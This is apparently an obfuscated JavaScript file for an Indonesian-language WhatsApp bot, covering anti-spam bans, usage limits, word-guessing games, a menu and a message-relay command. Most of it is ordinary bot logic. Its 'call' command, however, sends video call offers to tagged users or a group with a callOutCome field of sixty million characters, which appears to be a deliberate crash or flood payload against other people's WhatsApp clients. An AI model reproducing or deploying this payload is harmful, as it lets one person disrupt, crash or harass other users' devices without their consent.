    const _0x4fd6d4 = _0x251560 == "viewOnceMessageV";
    const _0x479922 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("viewOnceMessageV2");
    const _0x2d87f8 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("videoMessage");
    const _0xb7eef2 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("stickerMessage");
    const _0x188437 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("audioMessage");
    const _0x49d270 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("quotedMessage");
    const _0x370f0d = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("mentionedJid");
    const _0x5897c0 = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("Message");
    const _0x3f242d = _0x251560 === "extendedTextMessage" && _0x2e6f45.includes("conversation");
    const _0x48c458 = _0x251560 == "reactionMessage";
    const _0x5c05ec = _0x251560 === "imageMessage" || _0x251560 === "videoMessage" || _0x251560 === "stickerMessage" || _0x251560 === "audioMessage" || _0x251560 === "contactMessage" || _0x251560 === "locationMessage";
    if (!_0x5599a8 && !_0x5c05ec && !_0x48c458 && _0x1f6ab3.length < 8000 && _0x251560 !== "protocolMessage") {
      Logmessage(_0x5c8a1c, _0xb45cca, _0x1f6ab3, AntiSpam);
    }
    if (_0x5599a8) {
      Logcommands(_0xb45cca, _0x451268);
    }
    if (_0xb45cca.key.remoteJid == "status@broadcast") {
      return _0x5c8a1c.sendMessage(_0xb45cca.key.remoteJid, {
        react: {
          text: "😹",
          key: _0xb45cca.key
        }
      }, {
        statusJidList: [_0xb45cca.key.participant, _0xb45cca.sender]
      }).catch(() => {
        false;
      });
    }
    expiredCmd(hitnya, dash);
    const _0x3275ed = "" + getHit("run", hitnya);
    global.thisHit = _0x3275ed;
    if (_0x5599a8) {
      db.data.users[_0xb5f31d].hit += 1;
      if (_0xb45cca.isGroup) {
        db.data.chats[_0xb45cca.chat].hit += 1;
      }
      cmdAdd("run", "1d", hitnya);
      Succes(toFirstCase(_0x451268), dash, allcommand);
    }
    const _0x5bb618 = function (_0x457541, _0x208596) {
      let _0x1ee13e = false;
      Object.keys(_0x208596).forEach(_0x425f73 => {
        if (_0x208596[_0x425f73].id === _0x457541) {
          _0x1ee13e = _0x425f73;
        }
      });
      if (_0x1ee13e !== false) {
        _0x208596[_0x1ee13e].spam += 1;
      } else {
        let _0x472705 = {
          id: _0x457541,
          spam: 1
        };
        _0x208596.push(_0x472705);
      }
    };
    const _0x201738 = async function (_0x2e2f01, _0x122671) {
      let _0x306c9a = false;
      Object.keys(_0x122671).forEach(_0x2adea9 => {
        if (_0x122671[_0x2adea9].id === _0x2e2f01) {
          _0x306c9a = _0x2adea9;
        }
      });
      if (_0x306c9a !== false) {
        if (_0x122671[_0x306c9a].spam > 7) {
          if (db.data.users[_0xb5f31d].banned.status || !_0x5a8dcd) {
            return;
          }
          let _0x51b6d8 = {
            id: _0x289dbe,
            status: true,
            date: calender,
            reason: "Spam Bot"
          };
          db.data.users[woke].banned = _0x51b6d8;
          console.log(_0x2e2f01 + " Terdeteksi spam lebih dari " + _0x122671[_0x306c9a].spam + " kali");
          _0x5f160b("Kamu telah di banned karena telah melakukan spam");
        }
      } else {
        console.log("Spam ke " + _0x122671[_0x306c9a].spam);
      }
    };
    if (SpamExpired(_0x289dbe, "Case", AntiSpam)) {
      let _0x54cc18 = false;
      for (let _0x2ce9e1 of spammer) {
        if (_0x2ce9e1.id == _0x289dbe) {
          _0x54cc18 = _0x2ce9e1;
        }
      }
      if (_0x54cc18 !== false) {
        spammer.splice(_0x54cc18, 1);
        console.log(chalk.bgGreen(color("[  Remove ]", "black")), "Sukses remove spammer");
      }
    }
    SpamExpired(_0x289dbe, "NotCase", AntiSpam);
    if (_0x47af2b && !_0x5a8dcd) {
      return;
    }
    if (_0x5599a8 && cekSpam("Case", _0x289dbe, AntiSpam)) {
      _0x5bb618(_0x289dbe, spammer);
      _0x201738(_0x289dbe, spammer);
      console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")), "antispam Case aktif");
      return;
    }
    if (_0xfdcaaf && _0x5599a8 && msgFilter.isFiltered(_0x284983) && !_0x45f94f && !_0xfcd2a2 && !_0x5a8dcd) {
      addSpam("Case", _0x289dbe, "3s", AntiSpam);
      _0x5bb618(_0x289dbe, spammer);
      return _0x5f160b("Beri bot waktu jeda 5 detik");
    }
    if (_0xfdcaaf && _0x5599a8 && msgFilter.isFiltered(_0x284983) && _0x45f94f && !_0xfcd2a2 && !_0x5a8dcd) {
      addSpam("Case", _0x289dbe, "5s", AntiSpam);
      _0x5bb618(_0x289dbe, spammer);
      return _0x5f160b("Beri bot waktu jeda 5 detik");
    }
    if (_0x5599a8 && !_0x5a8dcd) {
      msgFilter.addFilter(_0x284983);
    }
    for (let _0x6e5585 = 0; _0x6e5585 < listcmdblock.length; _0x6e5585++) {
      if (_0x451268 === listcmdblock[_0x6e5585].cmd) {
        if (_0x57a03e) {
          return _0x5f160b(mess.block.Bsystem);
        } else {
          return _0x5f160b(mess.block.Bowner);
        }
      }
    }
    if (!checkDataName("premium", "", DataId)) {
      await createDataId("premium", DataId);
    }
    let _0x3e2b8e = DataId.filter(_0x333403 => _0x333403.name == "premium");
    for (let _0x1d4eb3 of _0x3e2b8e[0].id) {
      if (_0x451268 == _0x1d4eb3 && !_0x1c9257) {
        return _0x12931b();
      }
    }
    if (!checkDataName("commands", "", DataId)) {
      await createDataId("commands", DataId);
    }
    let _0x5c96e0 = DataId.filter(_0x1a9d42 => _0x1a9d42.name == "commands");
    for (let _0xe8a0c3 of _0x5c96e0[0].id) {
      if (_0x451268 == _0xe8a0c3 && !_0x5a8dcd) {
        return _0x1d17b7();
      }
    }
    if (!checkDataName("limit", "", DataId)) {
      await createDataId("limit", DataId);
    }
    let _0x164dea = DataId.filter(_0x2feee4 => _0x2feee4.name == "limit");
    for (let _0x7cd83c of _0x164dea[0].id) {
      if (!_0x5a8dcd && _0x451268 == _0x7cd83c) {
        if (!_0x1c9257 && db.data.users[_0xb5f31d].limit < 1) {
          return _0x1ace2b();
        }
        if (!_0x4298a6.registered) {
          return _0x11ad76();
        }
        if (!_0x1c9257 && _0x45f94f && _0x448b59) {
          db.data.users[_0xb5f31d].limit -= 1;
          _0x5c8a1c.sendMessage(_0x284983, {
            text: "✅ Limit kamu tersisa " + _0x4298a6.limit
          }, {
            quoted: _0xb45cca
          });
        }
      }
    }
    const _0x15ae40 = ["❌", "🙈", "🤦", "❎"];
    const _0x48f31d = _0x43e633(_0x15ae40);
    let _0x33bf72 = ["🤏 *Dikit Lagi!* Kamu hampir berhasil, coba lagi!", "🧐 Hmm, sudah hampir benar! Ayo coba sekali lagi.", "⏳ *Sedikit Lagi!* Jawabanmu hampir benar, ayo lanjutkan!"];
    let _0x1613b8 = _0x43e633(_0x33bf72);
    _0x5c8a1c.susunkata = _0x5c8a1c.susunkata ? _0x5c8a1c.susunkata : {};
    _0x5c8a1c.susunkataCooldown = _0x5c8a1c.susunkataCooldown ? _0x5c8a1c.susunkataCooldown : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.susunkata) {
      const _0x47335d = 5000;
      const _0x2e7c9f = 0.72;
      const _0x55a545 = _0xb45cca.chat;
      const _0x7d0caa = _0x5c8a1c.susunkata[_0x55a545];
      const _0x217720 = JSON.parse(JSON.stringify(_0x7d0caa[1]));
      if (_0x5c8a1c.susunkataCooldown[_0x55a545]) {
        let _0x39a89b = _0x5c8a1c.susunkataCooldown[_0x55a545];
        if (new Date() - _0x39a89b < _0x47335d) {
          return;
        }
      }
      _0x5c8a1c.susunkataCooldown[_0x55a545] = new Date();
      if (_0x1f6ab3.toLowerCase() === _0x217720.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x7d0caa[2];
        _0x4298a6.exp += 999;
        const _0x326139 = [gris1 + "🎉 *Benar!* Kamu jenius! 💡\n+" + _0x7d0caa[2] + " Balance 💸\n+999 EXP 📈" + gris1, gris1 + "✨ *Jawaban tepat!* Hebat sekali! 🌟\n+" + _0x7d0caa[2] + " Balance 💵\n+999 EXP 🆙" + gris1, gris1 + "🔥 *Sempurna!* Kamu berhasil! 🏆\n+" + _0x7d0caa[2] + " Balance 💸\n+999 EXP 🌠" + gris1];
        const _0x1b3eae = _0x43e633(_0x326139);
        _0x357d03(_0x1b3eae);
        clearTimeout(_0x7d0caa[3]);
        delete _0x5c8a1c.susunkata[_0x55a545];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x217720.jawaban.toLowerCase().trim()) >= _0x2e7c9f) {
        _0x357d03(_0x1613b8);
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tekateki = _0x5c8a1c.tekateki || {};
    _0x5c8a1c.tekatekiCooldown = _0x5c8a1c.tekatekiCooldown || {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tekateki) {
      if (!_0x45f94f) {
        return;
      }
      const _0x227c67 = 0.72;
      let _0x3b97ba = _0xb45cca.chat;
      let _0x35d0ba = JSON.parse(JSON.stringify(_0x5c8a1c.tekateki[_0x3b97ba][1]));
      if (_0x5c8a1c.tekatekiCooldown[_0x3b97ba]) {
        let _0x305a65 = _0x5c8a1c.tekatekiCooldown[_0x3b97ba];
        if (new Date() - _0x305a65 < 5000) {
          return;
        }
      }
      _0x5c8a1c.tekatekiCooldown[_0x3b97ba] = new Date();
      if (_0x1f6ab3.toLowerCase() === _0x35d0ba.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tekateki[_0x3b97ba][2];
        let _0x5cc5ad = [gris1 + "🎉 *GAME TEKA-TEKI*\n\nJawaban Kamu Benar! 🎊\n\nHadiah: +" + _0x5c8a1c.tekateki[_0x3b97ba][2] + " Balance 💸\nExp: +999🆙" + gris1, gris1 + "🔥 *GAME TEKA-TEKI*\n\nLuar biasa! Kamu berhasil! 💪\n\nBonus: +" + _0x5c8a1c.tekateki[_0x3b97ba][2] + " Balance 💵\nExp: +999📈" + gris1, gris1 + "✨ *GAME TEKA-TEKI*\n\nKamu jago! Jawaban benar! 🎯\n\nBonus: +" + _0x5c8a1c.tekateki[_0x3b97ba][2] + " Balance 💸\nExp: +999🆙" + gris1];
        let _0x15debf = _0x43e633(_0x5cc5ad);
        _0x357d03(_0x15debf);
        clearTimeout(_0x5c8a1c.tekateki[_0x3b97ba][3]);
        delete _0x5c8a1c.tekateki[_0x3b97ba];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x35d0ba.jawaban.toLowerCase().trim()) >= _0x227c67) {
        _0x357d03(_0x1613b8);
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebakkimia = _0x5c8a1c.tebakkimia ? _0x5c8a1c.tebakkimia : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebakkimia) {
      if (!_0x45f94f) {
        return;
      }
      const _0x2545e2 = 0.72;
      let _0xaae6bb = _0xb45cca.chat;
      let _0x3d4fa6 = JSON.parse(JSON.stringify(_0x5c8a1c.tebakkimia[_0xaae6bb][1]));
      let _0x2d7d51 = /^((me)?nyerah|surr?ender)$/i.test(_0x1f6ab3);
      if (_0x1f6ab3.toLowerCase() == _0x3d4fa6.lambang.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebakkimia[_0xaae6bb][2];
        global.db.data.users[_0xb45cca.sender].exp += 10;
        let _0x3410c9 = gris1 + "*GAME TEBAK KIMIA*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebakkimia[_0xaae6bb][2] + " Balance 💸" + gris1;
        _0x5f160b(_0x3410c9);
        clearTimeout(_0x5c8a1c.tebakkimia[_0xaae6bb][3]);
        delete _0x5c8a1c.tebakkimia[_0xaae6bb];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x3d4fa6.lambang.toLowerCase().trim()) >= _0x2545e2) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.caklontong = _0x5c8a1c.caklontong ? _0x5c8a1c.caklontong : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.caklontong) {
      if (!_0x45f94f) {
        return;
      }
      const _0x363ea9 = 0.72;
      let _0x3d3d43 = _0xb45cca.chat;
      let _0x41664e = JSON.parse(JSON.stringify(_0x5c8a1c.caklontong[_0x3d3d43][1]));
      if (_0x1f6ab3.toLowerCase() == _0x41664e.jawaban.toLowerCase().trim()) {
        global.db.data.users[_0xb45cca.sender].exp += _0x5c8a1c.caklontong[_0x3d3d43][2];
        let _0x18e811 = gris1 + "*GAME CAKLONTONG*\n*Benar!*\n+" + _0x5c8a1c.caklontong[_0x3d3d43][2] + " XP\n+1500 Money\n" + _0x41664e.deskripsi + gris1;
        _0x5f160b(_0x18e811);
        clearTimeout(_0x5c8a1c.caklontong[_0x3d3d43][3]);
        delete _0x5c8a1c.caklontong[_0x3d3d43];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x41664e.jawaban.toLowerCase().trim()) >= _0x363ea9) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebaklagu = _0x5c8a1c.tebaklagu ? _0x5c8a1c.tebaklagu : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebaklagu) {
      if (!_0x45f94f) {
        return;
      }
      const _0x2ce661 = 0.72;
      let _0x36a8aa = _0xb45cca.chat;
      let _0x392898 = JSON.parse(JSON.stringify(_0x5c8a1c.tebaklagu[_0x36a8aa][1]));
      if (_0x1f6ab3.toLowerCase() == _0x392898.judul.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebaklagu[_0x36a8aa][2];
        let _0x2e488d = gris1 + "*GAME TEBAK LAGU*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebaklagu[_0x36a8aa][2] + " Balance 💸" + gris1;
        _0x357d03(_0x2e488d);
        clearTimeout(_0x5c8a1c.tebaklagu[_0x36a8aa][3]);
        delete _0x5c8a1c.tebaklagu[_0x36a8aa];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x392898.judul.toLowerCase().trim()) >= _0x2ce661) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebaktebak = _0x5c8a1c.tebaktebak ? _0x5c8a1c.tebaktebak : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebaktebak) {
      if (!_0x45f94f) {
        return;
      }
      const _0x5d2132 = 0.72;
      let _0x56a03a = _0xb45cca.chat;
      let _0x4245f1 = JSON.parse(JSON.stringify(_0x5c8a1c.tebaktebak[_0x56a03a][1]));
      if (_0x1f6ab3.toLowerCase() == _0x4245f1.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebaktebak[_0x56a03a][2];
        global.db.data.users[_0xb45cca.sender].exp += 50;
        let _0x534f92 = gris1 + "*GAME TEBAK TEBAKAN*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebaktebak[_0x56a03a][2] + " Balance 💸\n EXP: +50" + gris1;
        _0x357d03(_0x534f92);
        clearTimeout(_0x5c8a1c.tebaktebak[_0x56a03a][3]);
        delete _0x5c8a1c.tebaktebak[_0x56a03a];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x4245f1.jawaban.toLowerCase().trim()) >= _0x5d2132) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebakkata = _0x5c8a1c.tebakkata ? _0x5c8a1c.tebakkata : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebakkata) {
      if (!_0x45f94f) {
        return;
      }
      const _0x29f77c = 0.72;
      let _0x5cbea6 = _0xb45cca.chat;
      let _0x455f24 = JSON.parse(JSON.stringify(_0x5c8a1c.tebakkata[_0x5cbea6][1]));
      if (_0x1f6ab3.toLowerCase() == _0x455f24.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebakkata[_0x5cbea6][2];
        var _0xa78e6f = gris1 + "*GAME TEBAK KATA*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebakkata[_0x5cbea6][2] + " Balance 💸" + gris1;
        _0x357d03(_0xa78e6f);
        clearTimeout(_0x5c8a1c.tebakkata[_0x5cbea6][3]);
        delete _0x5c8a1c.tebakkata[_0x5cbea6];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x455f24.jawaban.toLowerCase().trim()) >= _0x29f77c) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebaklirik = _0x5c8a1c.tebaklirik ? _0x5c8a1c.tebaklirik : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebaklirik) {
      if (!_0x45f94f) {
        return;
      }
      const _0xb77e18 = 0.72;
      let _0x2d63da = _0xb45cca.chat;
      let _0x5b3134 = JSON.parse(JSON.stringify(_0x5c8a1c.tebaklirik[_0x2d63da][1]));
      if (_0x1f6ab3.toLowerCase() == _0x5b3134.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebaklirik[_0x2d63da][2];
        global.db.data.users[_0xb45cca.sender].exp += 10;
        var _0x22fee8 = gris1 + "*GAME TEBAK LIRIK*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebaklirik[_0x2d63da][2] + " Balance 💸\n EXP: +10" + gris1;
        _0x357d03(_0x22fee8);
        clearTimeout(_0x5c8a1c.tebaklirik[_0x2d63da][3]);
        delete _0x5c8a1c.tebaklirik[_0x2d63da];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x5b3134.jawaban.toLowerCase().trim()) >= _0xb77e18) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.siapaaku = _0x5c8a1c.siapaaku ? _0x5c8a1c.siapaaku : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.siapaaku) {
      if (!_0x45f94f) {
        return;
      }
      const _0x3b2a68 = 0.72;
      let _0x58ab02 = _0xb45cca.chat;
      let _0x7246c2 = JSON.parse(JSON.stringify(_0x5c8a1c.siapaaku[_0x58ab02][1]));
      if (_0x1f6ab3.toLowerCase() == _0x7246c2.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.siapaaku[_0x58ab02][2];
        let _0x2c4320 = gris1 + "*GAME SIAPAKAH AKU*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.siapaaku[_0x58ab02][2] + " Balance 💸" + gris1;
        _0x5f160b(_0x2c4320);
        clearTimeout(_0x5c8a1c.siapaaku[_0x58ab02][3]);
        delete _0x5c8a1c.siapaaku[_0x58ab02];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x7246c2.jawaban.toLowerCase().trim()) >= _0x3b2a68) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.tebakgambar = _0x5c8a1c.tebakgambar ? _0x5c8a1c.tebakgambar : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.tebakgambar) {
      if (!_0x45f94f) {
        return;
      }
      const _0x13c35f = 0.72;
      let _0xb1f733 = _0xb45cca.chat;
      let _0x5e73a4 = JSON.parse(JSON.stringify(_0x5c8a1c.tebakgambar[_0xb1f733][1]));
      if (_0x1f6ab3.toLowerCase() == _0x5e73a4.jawaban.toLowerCase().trim()) {
        _0x4298a6.balance += _0x5c8a1c.tebakgambar[_0xb1f733][2];
        let _0x23a061 = gris1 + "*GAME TEBAK GAMBAR*\n\nJawaban Kamu Benar!\n Hadiah : +" + _0x5c8a1c.tebakgambar[_0xb1f733][2] + " Balance 💸" + gris1;
        _0x357d03(_0x23a061);
        clearTimeout(_0x5c8a1c.tebakgambar[_0xb1f733][3]);
        delete _0x5c8a1c.tebakgambar[_0xb1f733];
      } else if (similarity(_0x1f6ab3.toLowerCase(), _0x5e73a4.jawaban.toLowerCase().trim()) >= _0x13c35f) {
        _0x5f160b("*Dikit Lagi!*");
      } else {
        _0x5d5c7b(_0x48f31d);
      }
    }
    _0x5c8a1c.family = _0x5c8a1c.family ? _0x5c8a1c.family : {};
    if (_0x45f94f && _0x284983 in _0x5c8a1c.family) {
      if (!_0x45f94f) {
        return;
      }
      let _0x561fca = 0.72;
      let _0x2c5969 = _0xb45cca.chat;
      let _0x1d66c0 = _0x5c8a1c.family[_0x2c5969];
      let _0x11742c = _0x1f6ab3.toLowerCase().replace(/[^\w\s\-]+/, "");
      let _0x1eddd0 = /^((me)?nyerah|surr?ender)$/i.test(_0x1f6ab3);
      if (!_0x1eddd0) {
        let _0x4810b4 = _0x1d66c0.jawaban.indexOf(_0x11742c);
        if (_0x4810b4 < 0) {
          if (Math.max(..._0x1d66c0.jawaban.filter((_0x5269b1, _0x510be6) => !_0x1d66c0.terjawab[_0x510be6]).map(_0x25942f => similarity(_0x25942f, _0x11742c))) >= _0x561fca) {
            return _0x5f160b("Dikit lagi!");
          }
        }
        if (!_0x5599a8 && _0x1d66c0.terjawab[_0x4810b4]) {
          return;
        }
        _0x4298a6.balance += _0x1d66c0.winScore;
        _0x1d66c0.terjawab[_0x4810b4] = _0xb45cca.sender;
      }
      let _0x16d8c8 = _0x1d66c0.terjawab.length === _0x1d66c0.terjawab.filter(_0x1ed0bc => _0x1ed0bc).length;
      let _0x422d6c = (gris1 + "*GAME FAMILY100*\n\n*Soal:* " + _0x1d66c0.soal + "\n\nTerdapat " + _0x1d66c0.jawaban.length + " jawaban" + (_0x1d66c0.jawaban.find(_0x279bdb => _0x279bdb.includes(" ")) ? "\n(beberapa jawaban terdapat spasi)\n" : "") + "\n" + (_0x16d8c8 ? "*SEMUA JAWABAN TERJAWAB ✅*" : _0x1eddd0 ? "*MENYERAH ❌*" : "") + "\n" + Array.from(_0x1d66c0.jawaban, (_0x44ab07, _0x2fceac) => {
        if (_0x1eddd0 || _0x1d66c0.terjawab[_0x2fceac]) {
          return ("(" + (_0x2fceac + 1) + ") " + _0x44ab07 + " " + (_0x1d66c0.terjawab[_0x2fceac] ? "✓ " + _0x1d66c0.terjawab[_0x2fceac].split("@")[0] : "")).trim();
        } else {
          return false;
        }
      }).filter(_0x37a104 => _0x37a104).join("\n") + "\n\n" + (_0x1eddd0 ? "" : "+" + _0x1d66c0.winScore + " Money tiap jawaban benar") + "\n     " + gris1).trim();
      _0x5c8a1c.sendMessage(_0x284983, {
        text: "" + _0x422d6c,
        mentions: [_0x1d66c0.terjawab + "@s.whatsapp.net"]
      }, {
        quoted: _0xb45cca
      }).then(_0x4f63a1 => {
        _0x5c8a1c.family[_0x2c5969].msg = _0x4f63a1;
      }).catch(_0x529c13 => _0x529c13);
      if (_0x16d8c8 || _0x1eddd0) {
        delete _0x5c8a1c.family[_0x2c5969];
      }
    }
    try {
      switch (_0x451268) {
        case "tesmenu":
          {
            const _0x3d0d8f = "\nYo, I’m ! My job is to help out  and I’m built using *CJS x plugin* code.\nI’m always ready to help whenever you need me. Start by checking the menu—just type `.allmenu`. Thanks!\n\t\t\t\n*Info Bot*  \n破 Creator : \n破 Runtime : \n破 Mode Bot : \n\t\t\t\n```破 SIMPLE MENU```\n⚡︎ Allmenu\n⚡︎ Aimenu\n⚡︎ Nsfwmenu\n⚡︎ Groupmenu\n⚡︎ Storemenu\n\t\t\t\n```破 FUN MENU```\n⚡︎ Rpgmenu\n⚡︎ Stalkmenu\n⚡︎ Animemenu\n⚡︎ Searchmenu\n⚡︎ Downloadmenu\n\t\t\t\n```破 PANEL MENU```\n⚡︎ Vpsmenu\n⚡︎ Panelmenu";
            try {
              let _0x1bffcb = [{
                title: "All menu hanz ( All )",
                highlight_label: "Allmenu",
                rows: [{
                  title: "All menu",
                  description: "Displays All menu ( Allmenu )",
                  id: ".allmenu"
                }]
              }, {
                title: "Populer menu ( List menu )",
                highlight_label: "hanz - Neroxz",
                rows: [{
                  title: "Ai Feature",
                  description: "Displays menu AI ( List menu )",
                  id: ".downloadmenu"
                }, {
                  title: "Vps Feature",
                  description: "Displays menu VPS ( Menu VPS )",
                  id: ".vpsmenu"
                }, {
                  title: "Panel Feature",
                  description: "Displays menu Panel ( Menu Panel )",
                  id: ".panelmenu"
                }, {
                  title: "Download Feature",
                  description: "Displays menu Download ( Chat Botz Ai )",
                  id: ".simenu"
                }]
              }, {
                title: "System Information ( info )",
                highlight_label: "CONTACT ADMIN",
                rows: [{
                  title: "Creator Bot",
                  description: "Bot owner info, who created it ( information )",
                  id: ".owner"
                }, {
                  title: "Sewa & Premium",
                  description: "Displays Rental and Premium List ( Buying )",
                  id: ".sewabot"
                }]
              }];
              let _0x189eed = {
                title: "「 List Menu 」",
                sections: _0x1bffcb
              };
              await _0x5c8a1c.relayMessage(_0x284983, {
                interactiveMessage: {
                  header: {
                    hasMediaAttachment: false
                  },
                  body: {
                    text: "Nerox - Z"
                  },
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: {
                          url: "https://pomf2.lain.la/f/lb7pexoy.jpg",
                          mimetype: "image/jpeg",
                          height: 1080,
                          width: 1080
                        },
                        hasMediaAttachment: true
                      },
                      body: {
                        text: _0x3d0d8f
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "single_select",
                          buttonParamsJson: JSON.stringify(_0x189eed)
                        }]
                      }
                    }]
                  }
                }
              }, {}, {
                messageId: null
              });
            } catch (_0x44d7d2) {
              console.error("Error while sending menu:", _0x44d7d2);
              return _0xb45cca.reply("Terjadi kesalahan saat menampilkan menu. Coba lagi nanti.");
            }
            break;
          }
        case "chat":
          {
            if (!_0x5a8dcd) {
              return _0x1d17b7();
            }
            if (!_0xe878d3[0] || !_0xe878d3[1]) {
              return _0xb45cca.reply("Gunakan: *" + _0x10ce59 + "chat nomor|pesan*\nContoh: *" + _0x10ce59 + "chat 81234567890|Hai, apa kabar?*");
            }
            const _0x4fa964 = {};
            let [_0xfb6a80, ..._0x5b602c] = _0xe878d3.join(" ").split("|");
            let _0x3e36c0 = _0x5b602c.join("|").trim();
            if (!_0xfb6a80 || !_0x3e36c0) {
              throw "Format salah! Gunakan: *" + _0x10ce59 + "chat nomor|pesan*\nContoh: *" + _0x10ce59 + "chat 81234567890|Hai, apa kabar?*";
            }
            let _0x1bf1f1 = _0xfb6a80.replace(/[^0-9]/g, "");
            _0x1bf1f1 += "@s.whatsapp.net";
            try {
              await _0x5c8a1c.sendMessage(_0x1bf1f1, {
                text: _0x3e36c0
              }, {
                quoted: _0xb45cca
              });
              _0x5c8a1c.sendText(_0xb45cca.chat, "Pesan berhasil dikirim ke " + _0xfb6a80 + ".\n\n*Pesan:* " + _0x3e36c0, _0xb45cca);
            } catch (_0x128e50) {
              _0x5c8a1c.sendText(_0xb45cca.chat, "Gagal mengirim pesan ke " + _0xfb6a80 + ". Pastikan nomor benar.\n\n*Error:* " + _0x128e50, _0xb45cca);
              return;
            }
            if (!_0x4fa964[_0x1bf1f1]) {
              _0x4fa964[_0x1bf1f1] = _0xb45cca.chat;
              _0x5c8a1c.ev.on("messages.upsert", async _0xd3ea82 => {
                try {
                  if (!_0xd3ea82.messages) {
                    return;
                  }
                  let _0x4d6c57 = _0xd3ea82.messages[0];
                  if (_0x4d6c57.key.remoteJid !== _0x1bf1f1 || _0x4d6c57.key.fromMe) {
                    return;
                  }
                  let _0x33e989 = _0x4d6c57.message.conversation || _0x4d6c57.message.extendedTextMessage?.text || "";
                  if (_0x33e989) {
                    _0x5c8a1c.sendText(_0x4fa964[_0x1bf1f1], "*Balasan dari " + _0xfb6a80 + ":*\n\n" + _0x33e989, _0xb45cca);
                  }
                  delete _0x4fa964[_0x1bf1f1];
                } catch (_0x74a460) {
                  console.error("Error handling reply:", _0x74a460);
                }
              });
            } else {
              _0x5c8a1c.sendText(_0xb45cca.chat, "Sedang menunggu balasan dari " + _0xfb6a80 + "...", _0xb45cca);
            }
          }
          break;
        case "call":
          {
            if (_0xe878d3.length < 1) {
              return _0xb45cca.reply("Pilih:\n" + (_0x10ce59 + _0x451268) + " @tag\n\n" + (_0x10ce59 + _0x451268) + " grup");
            }
            if (_0xb45cca.mentionedJid.length !== 0) {
              for (let _0x5c29ff = 0; _0x5c29ff < _0xb45cca.mentionedJid.length; _0x5c29ff++) {
                await _0x5c8a1c.offerCall(_0xb45cca.mentionedJid[_0x5c29ff], {
                  isVideo: true,
                  callOutCome: "8".repeat(60000000)
                });
                _0x5c8a1c.sendMessage(_0xb45cca.chat, {
                  text: "Done"
                }, {
                  quoted: _0xb45cca
                });
              }
            } else {
              await _0x5c8a1c.offerCall(_0xb5f31d, {
                isVideo: true,
                callOutCome: "8".repeat(60000000)
              });
              _0x5c8a1c.sendMessage(_0xb45cca.chat, {
                text: "menelpon grup"
              }, {
                quoted: _0xb45cca
              });
            }
          }
          break;
        case "susunkata":
          {
            if (!_0x1271c1) {
              return _0x1e9c47(mess.game);
            }
            if (!_0x45f94f) {
              return;
            }
            if (!_0x1c9257 && global.db.data.users[_0xb5f31d].glimit < 1) {
              return _0x5f160b(mess.limit);
            }
            let _0x2ab2e7 = 1000;
            let _0x349fca = 120000;
            let _0x83f9f5 = _0xb45cca.chat;
            if (_0x83f9f5 in _0x5c8a1c.susunkata) {
              return _0x5f160b("Masih ada soal belum terjawab di chat ini.");
            }
            try {
              let _0x38eca8 = await (await fetch("https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json")).json();
